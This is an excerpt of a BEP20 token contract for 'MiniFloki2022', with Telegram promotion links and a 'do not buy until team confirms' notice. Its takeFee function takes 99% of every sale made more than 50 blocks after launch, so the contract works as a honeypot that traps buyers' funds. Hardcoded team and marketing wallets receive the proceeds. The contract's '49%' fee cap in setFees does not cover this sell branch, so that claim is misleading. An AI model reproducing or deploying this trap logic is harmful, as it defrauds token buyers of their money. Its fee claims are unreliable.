...
ʜᴛᴛᴘs://ᴛ.ᴍᴇ/MɪɴɪFʟᴏᴋɪ2022

BOUGHT TO YOU BY:- THE NAMES CARL
https://t.me/TheNamesCarl



DO NOT BUY UNTIL TEAM CONFIRMS, WE HAVE ANTIBOT MEASURES
...
contract DividendDistributor is IDividendDistributor {
    ...
    uint256 public minDistribution = 2 * (10 ** 14);
...
contract MiniFloki2022 is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "MiniFloki2022";
    string constant _symbol = "MF2022";
    ...
    uint256 public totalFee        = marketingFee + reflectionFee + liquidityFee + teamFee + burnFee + utilityFee;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x067C342434623E1d9998583d82Aba94b52d97A98;
        teamFeeReceiver = 0x277BdadF7A82Ab1a9C5Cac664abfdF748aFF3486;
        utilityFeeReceiver = 0xc90DfaB907436F52b80BFf06D5A46301E342d430;
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        ...
        } else if(isSell && (launchedAt + 50 < block.number)){
            feeAmount = amount.div(100).mul(99);
        }
    ...
    function swapBack() internal swapping {
        ...
        (tmpSuccess,) = payable(utilityFeeReceiver).call{value: amountBNBUtility, gas: 30000}("");
    ...
    function setFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _teamFee, uint256 _utilityFee, uint256 _burnFee, uint256 _feeDenominator) external authorized {
        ...
        burnFee = _burnFee;
        totalFee = _liquidityFee + _reflectionFee + _marketingFee + _teamFee + _burnFee + _utilityFee;
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator/2, "Fees cannot be more than 49%");
    }

    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _teamFeeReceiver, address _burnFeeReceiver, address _utilityFeeReceiver ) external authorized {
